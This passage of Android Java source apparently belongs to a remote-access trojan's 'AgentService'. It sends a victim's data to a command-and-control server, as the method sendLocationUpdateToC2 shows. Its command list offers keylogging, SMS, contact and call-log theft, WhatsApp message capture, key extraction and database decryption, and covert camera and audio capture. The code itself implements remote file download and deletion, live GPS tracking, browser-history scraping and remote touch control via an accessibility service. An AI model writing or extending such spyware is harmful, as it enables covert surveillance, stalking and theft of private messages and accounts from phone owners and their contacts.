                Bitmap bitmap = takeScreenshotViaPixelCopy();
                if (bitmap != null && !isAllWhite(bitmap)) {
                    return bitmap;
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Bitmap bitmap = takeScreenshotViaSurfaceControl();
                if (bitmap != null && !isAllWhite(bitmap)) {
                    return bitmap;
                }
            }

            return null;

        } catch (Exception e) {
            Log.e(TAG, "❌ View screenshot error: " + e.getMessage(), e);
            return null;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private Bitmap takeScreenshotViaPixelCopy() {
        try {
            Log.d(TAG, "📸 Trying PixelCopy...");
            return null;
        } catch (Exception e) {
            Log.e(TAG, "PixelCopy error: " + e.getMessage());
            return null;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.Q)
    private Bitmap takeScreenshotViaSurfaceControl() {
        try {
            Log.d(TAG, "📸 Trying SurfaceControl...");
            return null;
        } catch (Exception e) {
            Log.d(TAG, "SurfaceControl not available: " + e.getMessage());
            return null;
        }
    }

    private Bitmap takeScreenshotViaCanvas() {
        try {
            Log.d(TAG, "📸 Trying Canvas screenshot...");

            MediaProjection projection = ServiceController.getMediaProjection();
            if (projection != null) {
                return takeScreenshotWithMediaProjection(projection);
            }

            return null;

        } catch (Exception e) {
            Log.e(TAG, "Canvas screenshot error: " + e.getMessage());
            return null;
        }
    }

    private boolean isAllWhite(Bitmap bitmap) {
        if (bitmap == null) return true;

        try {
            int width = bitmap.getWidth();
            int height = bitmap.getHeight();

            int sampleCount = 0;
            int whiteCount = 0;

            int stepX = Math.max(1, width / 10);
            int stepY = Math.max(1, height / 10);

            for (int x = 0; x < width; x += stepX) {
                for (int y = 0; y < height; y += stepY) {
                    int pixel = bitmap.getPixel(x, y);
                    sampleCount++;

                    int r = Color.red(pixel);
                    int g = Color.green(pixel);
                    int b = Color.blue(pixel);

                    if (r > 240 && g > 240 && b > 240) {
                        whiteCount++;
                    }
                }
            }

            boolean allWhite = sampleCount > 0 && ((float) whiteCount / sampleCount) > 0.9;
            Log.d(TAG, "White detection: " + whiteCount + "/" + sampleCount + " -> " + (allWhite ? "ALL WHITE" : "OK"));

            return allWhite;

        } catch (Exception e) {
            Log.e(TAG, "White detection error: " + e.getMessage());
            return false;
        }
    }

    // AgentService.java - REPLACE method processScreenshot()

    private String processScreenshot(Bitmap bitmap) {
        try {
            if (bitmap == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Bitmap is null");
                return result.toString();
            }

            int maxWidth = 1920;
            int maxHeight = 1080;
            int width = bitmap.getWidth();
            int height = bitmap.getHeight();

            if (width > maxWidth || height > maxHeight) {
                float ratio = Math.min(
                        (float) maxWidth / width,
                        (float) maxHeight / height
                );
                int newWidth = (int) (width * ratio);
                int newHeight = (int) (height * ratio);
                bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            bitmap.recycle();

            byte[] imageData = baos.toByteArray();
            String encoded = Base64.encodeToString(imageData, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "screenshot");
            result.put("timestamp", System.currentTimeMillis());
            result.put("width", width);
            result.put("height", height);
            result.put("size", imageData.length);
            result.put("image_data", encoded);

            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Process screenshot error: " + e.getMessage());
            return errorJson(e.getMessage());
        }
    }

    private void requestMediaProjectionPermission() {
        try {
            Intent intent = new Intent(this, MainActivity.class);
            intent.putExtra("action", "request_screenshot_permission");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.d(TAG, "📸 Screenshot permission requested via MainActivity");
        } catch (Exception e) {
            Log.e(TAG, "Request permission error: " + e.getMessage());
        }
    }

    // ==================== SET WALLPAPER ====================

    private String setWallpaper(String imageBase64) {
        try {
            if (imageBase64 == null || imageBase64.isEmpty()) {
                return errorJson("No image data provided");
            }

            byte[] imageData = Base64.decode(imageBase64, Base64.DEFAULT);
            if (imageData == null || imageData.length == 0) {
                return errorJson("Invalid image data");
            }

            Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
            if (bitmap == null) {
                return errorJson("Failed to decode image");
            }

            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);

            boolean success = false;
            String method = "";

            try {
                wallpaperManager.setBitmap(bitmap);
                success = true;
                method = "setBitmap";
            } catch (Exception e) {
                Log.e(TAG, "setBitmap failed: " + e.getMessage());
            }

            if (!success) {
                try {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
                    byte[] streamData = baos.toByteArray();

                    wallpaperManager.setStream(new ByteArrayInputStream(streamData));
                    success = true;
                    method = "setStream";
                } catch (Exception e) {
                    Log.e(TAG, "setStream failed: " + e.getMessage());
                }
            }

            if (!success) {
                try {
                    wallpaperManager.setWallpaperOffsetSteps(1, 1);
                    wallpaperManager.suggestDesiredDimensions(bitmap.getWidth(), bitmap.getHeight());
                    wallpaperManager.setBitmap(bitmap);
                    success = true;
                    method = "setBitmap (alternate)";
                } catch (Exception e) {
                    Log.e(TAG, "Alternate setBitmap failed: " + e.getMessage());
                }
            }

            if (!success) {
                try {
                    File tempFile = new File(getCacheDir(), "wallpaper_temp.jpg");
                    FileOutputStream fos = new FileOutputStream(tempFile);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                    fos.close();

                    wallpaperManager.setStream(new FileInputStream(tempFile));
                    tempFile.delete();
                    success = true;
                    method = "setStream (from file)";
                } catch (Exception e) {
                    Log.e(TAG, "File setStream failed: " + e.getMessage());
                }
            }

            bitmap.recycle();

            JSONObject result = new JSONObject();
            result.put("status", success ? "success" : "error");
            result.put("message", success ? "Wallpaper changed successfully" : "Failed to change wallpaper");
            result.put("method", method);
            result.put("timestamp", System.currentTimeMillis());

            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Set wallpaper error: " + e.getMessage(), e);
            return errorJson(e.getMessage());
        }
    }

    private String setWallpaperFromUrl(String url) {
        try {
            if (url == null || url.isEmpty()) {
                return errorJson("URL is empty");
            }

            HttpURLConnection connection = null;
            InputStream inputStream = null;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            try {
                URL imageUrl = new URL(url);
                connection = (HttpURLConnection) imageUrl.openConnection();
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);
                connection.setRequestMethod("GET");
                connection.connect();

                if (connection.getResponseCode() == 200) {
                    inputStream = connection.getInputStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        baos.write(buffer, 0, bytesRead);
                    }
                    baos.flush();

                    String base64Image = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                    return setWallpaper(base64Image);
                } else {
                    return errorJson("Failed to download image: HTTP " + connection.getResponseCode());
                }
            } finally {
                if (inputStream != null) try {
                    inputStream.close();
                } catch (Exception e) {
                }
                if (connection != null) try {
                    connection.disconnect();
                } catch (Exception e) {
                }
                try {
                    baos.close();
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Set wallpaper from URL error: " + e.getMessage(), e);
            return errorJson(e.getMessage());
        }
    }

    // ==================== FILE DOWNLOAD ====================

    private String downloadFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "File not found: " + filePath);
                return result.toString();
            }

            FileInputStream fis = new FileInputStream(file);
            byte[] fileData = new byte[(int) file.length()];
            fis.read(fileData);
            fis.close();

            String encoded = Base64.encodeToString(fileData, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "file_download");
            result.put("filename", file.getName());
            result.put("path", filePath);
            result.put("size", file.length());
            result.put("size_formatted", formatFileSize(file.length()));
            result.put("data", encoded);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }
    
    // ==================== FILE OPERATIONS ====================
private String deleteRemoteFile(String filePath) {
    try {
        Log.d(TAG, "🗑️ Attempting to delete: " + filePath);
        
        File file = new File(filePath);
        if (!file.exists()) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "File not found: " + filePath);
            return result.toString();
        }

        if (!file.canWrite()) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Permission denied: Cannot delete file");
            return result.toString();
        }

        boolean deleted = file.delete();
        
        // Recursive delete untuk folder
        if (!deleted && file.isDirectory()) {
            deleted = deleteRecursive(file);
        }

        JSONObject result = new JSONObject();
        result.put("status", deleted ? "success" : "error");
        result.put("message", deleted ? "File deleted successfully" : "Failed to delete file");
        result.put("path", filePath);
        result.put("was_directory", file.isDirectory());
        result.put("timestamp", System.currentTimeMillis());
        
        Log.d(TAG, "🗑️ Delete result: " + (deleted ? "SUCCESS" : "FAILED") + " - " + filePath);
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "❌ Delete error: " + e.getMessage(), e);
        return errorJson("Delete failed: " + e.getMessage());
    }
}

// Helper recursive delete
private boolean deleteRecursive(File file) {
    if (file.isDirectory()) {
        File[] files = file.listFiles();
        if (files != null) {
            for (File f : files) {
                deleteRecursive(f);
            }
        }
    }
    return file.delete();
}


private String moveFile(String sourcePath, String destPath) {
    try {
        Log.d(TAG, "📦 Moving file from " + sourcePath + " to " + destPath);
        
        File source = new File(sourcePath);
        if (!source.exists()) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Source file not found: " + sourcePath);
            return result.toString();
        }
        
        if (!source.canRead()) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Cannot read source file: " + sourcePath);
            return result.toString();
        }
        
        File dest = new File(destPath);
        
        // Cek jika destination sudah ada
        if (dest.exists()) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Destination already exists: " + destPath);
            result.put("overwrite_available", true);
            return result.toString();
        }
        
        // Buat directory jika belum ada
        File parentDir = dest.getParentFile();
        if (parentDir != null && !parentDir.exists()) {
            if (!parentDir.mkdirs()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Failed to create destination directory: " + parentDir.getAbsolutePath());
                return result.toString();
            }
        }
        
        boolean moved = source.renameTo(dest);
        
        // Jika renameTo gagal, coba copy + delete
        if (!moved) {
            try {
                FileInputStream fis = new FileInputStream(source);
                FileOutputStream fos = new FileOutputStream(dest);
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
                fis.close();
                fos.close();
                
                if (source.delete()) {
                    moved = true;
                } else {
                    // Jika copy sukses tapi delete gagal, hapus destination
                    dest.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Copy fallback error: " + e.getMessage());
            }
        }
        
        JSONObject result = new JSONObject();
        result.put("status", moved ? "success" : "error");
        result.put("message", moved ? "File moved successfully" : "Failed to move file");
        result.put("source", sourcePath);
        result.put("destination", destPath);
        result.put("moved", moved);
        result.put("timestamp", System.currentTimeMillis());
        
        Log.d(TAG, "📦 Move result: " + (moved ? "SUCCESS" : "FAILED"));
        return result.toString();
        
    } catch (Exception e) {
        Log.e(TAG, "❌ Move error: " + e.getMessage(), e);
        return errorJson("Move failed: " + e.getMessage());
    }
}

// ==================== BROWSER COMMANDS ====================




    // ==================== HELP ====================

    private String getHelp() {
        JSONObject help = new JSONObject();
        try {
            JSONArray commands = new JSONArray();
            String[] cmdList = {
                    "GET_DEVICE_INFO - Get device information",
                    "GET_LOCATION - Get GPS location",
                    "GET_CLIPBOARD - Get clipboard content",
                    "GET_INSTALLED_APPS - List installed apps",
                    "GET_CONTACTS - Get contacts (100)",
                    "GET_SMS - Get SMS (50)",
                    "GET_CALL_LOGS - Get call logs (50)",
                    "GET_GALLERY - Get recent photos (50)",
                    "GET_FILES_LIST - List files in /sdcard",
                    "DOWNLOAD_FILE - Download File",
                    "Move File - Move Folder",
                    "Delete File",
                    "RECORD_AUDIO - Record audio (30s)",
                    "STOP_RECORDING - Stop recording",
                    "KEYLOG_START - Start keylogger",
                    "KEYLOG_STATUS - Get keylogger status",
                    "KEYLOG_STOP - Stop keylogger",
                    "KEYLOG_DUMP - Get keylogs",
                    "WA_INFO - Get WhatsApp info",
                    "WA_CONTACTS - Get WhatsApp contacts",
                    "WA_CAPTURE_START - Start WhatsApp message capture",
                    "WA_CAPTURE_STOP - Stop WhatsApp message capture",
                    "WA_CAPTURE_DUMP - Get captured WhatsApp messages",
                    "WA_CAPTURE_STATS - Get capture statistics",
                    "WA_CAPTURE_CLEAR - Clear captured messages",
                    "WA_BACKUP_INFO - Get WhatsApp backup info",
                    "WA_EXTRACT_KEY - Extract WhatsApp encryption key",
                    "WA_DECRYPT_DB - Decrypt WhatsApp database",
                    "GET_ACCOUNTS - Get device accounts",
                    "GET_GOOGLE_ACCOUNTS - Get Google accounts",
                    "CAMERA_SNAPSHOT - Take photo with camera",
                    "SCREENSHOT - Capture screen",
                    "SET_WALLPAPER <URL/base64> - Set wallpaper",
                    "SHOW_TOAST - Show toast message",
                    "HELP - Show this help"
            };
            for (String cmd : cmdList) {
                commands.put(cmd);
            }
            help.put("status", "success");
            help.put("commands", commands);
            help.put("count", commands.length());
            return help.toString();
        } catch (JSONException e) {
            return errorJson("Help generation failed");
        }
    }

    // ==================== HELPER METHODS ====================

    private String getBatteryPercentage() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level >= 0 && scale > 0) {
                    return String.valueOf((level * 100) / scale) + "%";
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery error", e);
        }
        return "Unknown";
    }

    private boolean isCharging() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                return status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            Log.e(TAG, "Charging check error", e);
        }
        return false;
    }

    private String getTotalStorage() {
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long total = stat.getBlockCountLong() * stat.getBlockSizeLong();
            return formatFileSize(total);
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getFreeStorage() {
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long free = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
            return formatFileSize(free);
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getScreenResolution() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            if (wm != null) {
                wm.getDefaultDisplay().getMetrics(metrics);
                return metrics.widthPixels + "x" + metrics.heightPixels;
            }
        } catch (Exception e) {
            Log.e(TAG, "Screen resolution error", e);
        }
        return "Unknown";
    }

    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    // ==================== HELPER METHODS ====================

    private String successJson(String message) {
        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", message);
            return result.toString();
        } catch (Exception e) {
            return "{\"status\":\"success\",\"message\":\"" + message + "\"}";
        }
    }
    
    
    // ==================== CAMERA STREAM METHODS ====================

// AgentService.java - Method startCameraStream()




    
    // AgentService.java - Tambahkan di bagian akhir sebelum lifecycle

// ==================== LOCATION TRACKING METHODS ====================

private String startLocationTracking(int intervalSeconds) {
    try {
        if (intervalSeconds < 5) intervalSeconds = 5;
        if (intervalSeconds > 60) intervalSeconds = 60;
        
        locationTrackingInterval = intervalSeconds;
        isLocationTracking = true;
        
        // Stop existing tracking
        stopLocationTrackingInternal();
        
        // Start new tracking
        locationTrackingHandler = new Handler(Looper.getMainLooper());
        locationTrackingRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isLocationTracking) return;
                
                backgroundHandler.post(() -> {
                    String location = getLocation();
                    try {
                        JSONObject locJson = new JSONObject(location);
                        if (locJson.optString("status").equals("success")) {
                            // Convert to map for history
                            Map<String, Object> historyEntry = new HashMap<>();
                            historyEntry.put("latitude", locJson.optDouble("latitude"));
                            historyEntry.put("longitude", locJson.optDouble("longitude"));
                            historyEntry.put("accuracy", locJson.optDouble("accuracy"));
                            historyEntry.put("provider", locJson.optString("provider"));
                            historyEntry.put("altitude", locJson.optDouble("altitude"));
                            historyEntry.put("speed", locJson.optDouble("speed"));
                            historyEntry.put("bearing", locJson.optDouble("bearing"));
                            historyEntry.put("timestamp", new Date().toString());
                            
                            synchronized (locationHistory) {
                                locationHistory.add(0, historyEntry);
                                if (locationHistory.size() > MAX_LOCATION_HISTORY) {
                                    locationHistory.remove(locationHistory.size() - 1);
                                }
                            }
                            
                            // Send real-time update to C2
                            sendLocationUpdateToC2(locJson);
                        }
                    } catch (JSONException e) {
                        Log.e(TAG, "Location tracking JSON error: " + e.getMessage());
                    }
                });
                
                if (isLocationTracking) {
                    locationTrackingHandler.postDelayed(this, locationTrackingInterval * 1000L);
                }
            }
        };
        
        locationTrackingHandler.post(locationTrackingRunnable);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "location_tracking");
        result.put("message", "Location tracking started");
        result.put("is_tracking", true);
        result.put("interval", locationTrackingInterval);
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();
        
    } catch (Exception e) {
        Log.e(TAG, "Start location tracking error: " + e.getMessage());
        return errorJson(e.getMessage());
    }
}

private String stopLocationTracking() {
    stopLocationTrackingInternal();
    
    try {
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "location_tracking");
        result.put("message", "Location tracking stopped");
        result.put("is_tracking", false);
        result.put("history_count", locationHistory.size());
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();
    } catch (JSONException e) {
        return errorJson(e.getMessage());
    }
}

private void stopLocationTrackingInternal() {
    isLocationTracking = false;
    if (locationTrackingHandler != null && locationTrackingRunnable != null) {
        locationTrackingHandler.removeCallbacks(locationTrackingRunnable);
        locationTrackingHandler = null;
        locationTrackingRunnable = null;
    }
}

private String getLocationTrackingStatus() {
    try {
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "location_tracking");
        result.put("is_tracking", isLocationTracking);
        result.put("interval", locationTrackingInterval);
        result.put("history_count", locationHistory.size());
        
        if (!locationHistory.isEmpty()) {
            result.put("last_location", new JSONObject(locationHistory.get(0)));
        }
        
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();
    } catch (JSONException e) {
        return errorJson(e.getMessage());
    }
}

private String getLocationHistory(int limit) {
    try {
        JSONArray historyArray = new JSONArray();
        int count = Math.min(limit, locationHistory.size());
        
        synchronized (locationHistory) {
            for (int i = 0; i < count; i++) {
                historyArray.put(new JSONObject(locationHistory.get(i)));
            }
        }
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "location_history");
        result.put("count", count);
        result.put("total", locationHistory.size());
        result.put("history", historyArray);
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();
    } catch (JSONException e) {
        return errorJson(e.getMessage());
    }
}

private void sendLocationUpdateToC2(JSONObject location) {
    if (out == null || !isConnected.get()) return;
    
    try {
        JSONObject update = new JSONObject();
        update.put("type", "location_update");
        update.put("agent_id", getAgentId());
        update.put("data", location);
        update.put("timestamp", System.currentTimeMillis());
        
        synchronized (out) {
            out.println(update.toString());
            out.flush();
        }
        Log.d(TAG, "📍 Location update sent to C2: " + 
            location.optDouble("latitude") + ", " + location.optDouble("longitude"));
    } catch (Exception e) {
        Log.e(TAG, "Send location update error: " + e.getMessage());
    }
}

// AgentService.java - REPLACE semua method browser dengan ini

// ==================== BROWSER COMMANDS (FIXED - NO DEPRECATED API) ====================

private String getBrowserInfo() {
    try {
        JSONArray browsers = new JSONArray();
        PackageManager pm = getPackageManager();

        String[] browserPackages = {
            "com.android.chrome", "com.chrome.beta", "com.chrome.dev",
            "org.mozilla.firefox", "org.mozilla.firefox_beta",
            "com.opera.browser", "com.opera.mini.native",
            "com.brave.browser", "com.microsoft.emmx",
            "com.sec.android.app.sbrowser", "com.vivaldi.browser",
            "com.duckduckgo.mobile.android", "com.kiwibrowser.browser"
        };

        for (String pkg : browserPackages) {
            try {
                PackageInfo info = pm.getPackageInfo(pkg, 0);
                JSONObject browser = new JSONObject();
                browser.put("package", pkg);
                browser.put("name", getBrowserDisplayName(pkg));
                browser.put("version", info.versionName);
                browser.put("version_code", info.versionCode);
                browser.put("installed", true);
                browsers.put(browser);
            } catch (PackageManager.NameNotFoundException e) {
                // Not installed - skip
            }
        }

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "browser_info");
        result.put("count", browsers.length());
        result.put("data", browsers);
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "Browser info error: " + e.getMessage(), e);
        return errorJson("Failed to get browser info: " + e.getMessage());
    }
}

// ==================== RDP TOUCH ====================

private String handleRDPTouch(String param) {
    try {
        String[] parts = param.split(",");
        if (parts.length < 2) return errorJson("Format: RDP_TOUCH x,y");
        
        float x = Float.parseFloat(parts[0].trim());
        float y = Float.parseFloat(parts[1].trim());
        
        // Convert percentage to actual coordinates
        x = (x / 100) * 720;
        y = (y / 100) * 1280;
        
        performTouch((int) x, (int) y);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_touch");
        result.put("x", x);
        result.put("y", y);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String handleRDPSwipe(String param) {
    try {
        String[] parts = param.split(",");
        if (parts.length < 4) return errorJson("Format: RDP_SWIPE x1,y1,x2,y2");
        
        float x1 = Float.parseFloat(parts[0].trim());
        float y1 = Float.parseFloat(parts[1].trim());
        float x2 = Float.parseFloat(parts[2].trim());
        float y2 = Float.parseFloat(parts[3].trim());
        
        // Convert percentage to actual coordinates
        x1 = (x1 / 100) * 720;
        y1 = (y1 / 100) * 1280;
        x2 = (x2 / 100) * 720;
        y2 = (y2 / 100) * 1280;
        
        performSwipe((int) x1, (int) y1, (int) x2, (int) y2);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_swipe");
        result.put("x1", x1);
        result.put("y1", y1);
        result.put("x2", x2);
        result.put("y2", y2);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String handleRDPKey(String param) {
    try {
        int keyCode = Integer.parseInt(param.trim());
        performKeyPress(keyCode);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_key");
        result.put("keycode", keyCode);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String handleRDPText(String param) {
    try {
        performTextInput(param);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_text");
        result.put("text", param);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String handleRDPScroll(String param) {
    try {
        int delta = Integer.parseInt(param.trim());
        performScroll(delta);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_scroll");
        result.put("delta", delta);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

// ==================== RDP SYSTEM COMMANDS ====================

private String performRDPBack() {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performBack();
        }
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_back");
        return result.toString();
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String performRDPHome() {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performHome();
        }
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_home");
        return result.toString();
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String performRDPRecent() {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performRecent();
        }
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_recent");
        return result.toString();
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

private String getRDPStatus() {
    try {
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp_status");
        result.put("is_streaming", screenStreamHelper != null && screenStreamHelper.isStreaming());
        result.put("frame_count", screenStreamHelper != null ? screenStreamHelper.getFrameCount() : 0);
        result.put("mode", "rdp");
        result.put("resolution", "720x1280");
        result.put("fps", 20);
        return result.toString();
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

// ==================== RDP ACTION EXECUTORS ====================

private void performTouch(int x, int y) {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            service.performClick(x, y);
            Log.d(TAG, "🖱️ Touch at: " + x + "," + y);
        }
    } catch (Exception e) {
        Log.e(TAG, "Touch error: " + e.getMessage());
    }
}

private void performSwipe(int x1, int y1, int x2, int y2) {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            service.performSwipe(x1, y1, x2, y2, 300);
            Log.d(TAG, "🖱️ Swipe: " + x1 + "," + y1 + " -> " + x2 + "," + y2);
        }
    } catch (Exception e) {
        Log.e(TAG, "Swipe error: " + e.getMessage());
    }
}

private void performKeyPress(int keyCode) {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performKeyPress(keyCode);
            Log.d(TAG, "⌨️ Key press: " + keyCode);
        }
    } catch (Exception e) {
        Log.e(TAG, "Key press error: " + e.getMessage());
    }
}

private void performTextInput(String text) {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performTextInput(text);
            Log.d(TAG, "⌨️ Text input: " + text);
        }
    } catch (Exception e) {
        Log.e(TAG, "Text input error: " + e.getMessage());
    }
}

private void performScroll(int delta) {
    try {
        KeyloggerService service = ServiceController.getKeyloggerService();
        if (service != null) {
            service.performScroll(delta);
            Log.d(TAG, "📜 Scroll: " + delta);
        }
    } catch (Exception e) {
        Log.e(TAG, "Scroll error: " + e.getMessage());
    }
}


private String getBrowserDisplayName(String packageName) {
    switch (packageName) {
        case "com.android.chrome": return "Chrome";
        case "com.chrome.beta": return "Chrome Beta";
        case "com.chrome.dev": return "Chrome Dev";
        case "org.mozilla.firefox": return "Firefox";
        case "org.mozilla.firefox_beta": return "Firefox Beta";
        case "com.opera.browser": return "Opera";
        case "com.opera.mini.native": return "Opera Mini";
        case "com.brave.browser": return "Brave";
        case "com.microsoft.emmx": return "Edge";
        case "com.sec.android.app.sbrowser": return "Samsung Internet";
        case "com.vivaldi.browser": return "Vivaldi";
        case "com.duckduckgo.mobile.android": return "DuckDuckGo";
        case "com.kiwibrowser.browser": return "Kiwi";
        default: return packageName;
    }
}

private String getBrowserHistory(String browserPackage) {
    try {
        JSONArray history = new JSONArray();
        Cursor cursor = null;

        // METHOD 1: Try Chrome history
        try {
            Uri chromeUri = Uri.parse("content://com.android.chrome.browser/history");
            String[] projection = {"url", "title", "date", "visits"};
            
            cursor = getContentResolver().query(chromeUri, projection, null, null, "date DESC LIMIT 100");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject entry = new JSONObject();
                    String url = getColumnValue(cursor, "url");
                    String title = getColumnValue(cursor, "title");
                    String date = getColumnValue(cursor, "date");
                    String visits = getColumnValue(cursor, "visits");

                    entry.put("url", url != null ? url : "");
                    entry.put("title", title != null ? title : "");
                    entry.put("date", date != null ? date : "");
                    entry.put("visits", visits != null ? visits : "0");
                    entry.put("browser", "chrome");
                    entry.put("domain", extractDomain(url));

                    history.put(entry);
                } while (cursor.moveToNext());
                cursor.close();
                cursor = null;
                Log.d(TAG, "✅ Chrome history: " + history.length() + " entries");
            }
        } catch (Exception e) {
            Log.w(TAG, "Chrome history failed: " + e.getMessage());
        }

        // METHOD 2: Try Firefox history
        if (history.length() == 0) {
            try {
                Uri firefoxUri = Uri.parse("content://org.mozilla.firefox.browser/history");
                String[] projection = {"url", "title", "date"};
                
                cursor = getContentResolver().query(firefoxUri, projection, null, null, "date DESC LIMIT 100");
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject entry = new JSONObject();
                        String url = getColumnValue(cursor, "url");
                        String title = getColumnValue(cursor, "title");
                        String date = getColumnValue(cursor, "date");

                        entry.put("url", url != null ? url : "");
                        entry.put("title", title != null ? title : "");
                        entry.put("date", date != null ? date : "");
                        entry.put("visits", "0");
                        entry.put("browser", "firefox");
                        entry.put("domain", extractDomain(url));

                        history.put(entry);
                    } while (cursor.moveToNext());
                    cursor.close();
                    cursor = null;
                    Log.d(TAG, "✅ Firefox history: " + history.length() + " entries");
                }
            } catch (Exception e) {
                Log.w(TAG, "Firefox history failed: " + e.getMessage());
            }
        }

        // METHOD 3: Try Samsung Browser history
